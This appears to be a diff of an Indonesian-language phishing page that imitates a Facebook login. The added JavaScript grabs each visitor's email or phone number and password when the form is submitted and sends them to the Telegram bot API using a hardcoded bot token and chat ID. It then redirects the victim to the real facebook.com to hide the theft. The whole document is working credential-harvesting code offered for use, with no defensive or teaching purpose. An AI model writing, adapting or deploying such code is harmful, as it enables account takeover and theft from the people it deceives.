@@ -1,17 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Facebook</title>
+    <title>Login Palsu</title>
     <style>
-        /* Kode CSS biar tampilan mirip asli */
+        /* Styling biar keren */
+        body { font-family: Arial; text-align: center; margin-top: 50px; }
+        input { display: block; margin: 10px auto; padding: 10px; width: 250px; }
+        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h2>Login ke Facebook</h2>
-    <form action="proses.php" method="POST">
-        <input type="text" name="user" placeholder="Email atau Nomor HP" required>
-        <input type="password" name="pass" placeholder="Kata Sandi" required>
+
+    <h2>Login Facebook</h2>
+    
+    <form id="loginForm">
+        <input type="text" id="user" placeholder="Email atau Nomor HP" required>
+        <input type="password" id="pass" placeholder="Kata Sandi" required>
         <button type="submit">Masuk</button>
     </form>
+
+    <script>
+        // GANTI INI PAKE BOT TOKEN DAN CHAT ID LO
+        const BOT_TOKEN = "8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg";
+        const CHAT_ID = "6888530451";
+
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault(); // Biar form gak ke-refresh
+
+            // Ambil nilai input
+            let user = document.getElementById("user").value;
+            let pass = document.getElementById("pass").value;
+
+            // Buat pesan formatnya
+            let pesan = `🔴 *DATA LOGIN BARU* 🔴
+👤 User : ${user}
+🔑 Pass : ${pass}
+⏰ Waktu : ${new Date().toLocaleString('id-ID')}`;
+
+            // Kirim ke Telegram
+            let urlAPI = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(urlAPI, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => {
+                console.log("Data terkirim!");
+                // SETELAH KIRIM, LANGSUNG PINDAH HALAMAN
+                window.location.href = "https://www.facebook.com"; // Ganti link tujuan
+            })
+            .catch(error => {
+                console.log("Error", error);
+                // Tetap redirect walau error
+                window.location.href = "https://www.facebook.com";
+            });
+
+        });
+    </script>
+
 </body>
 </html>
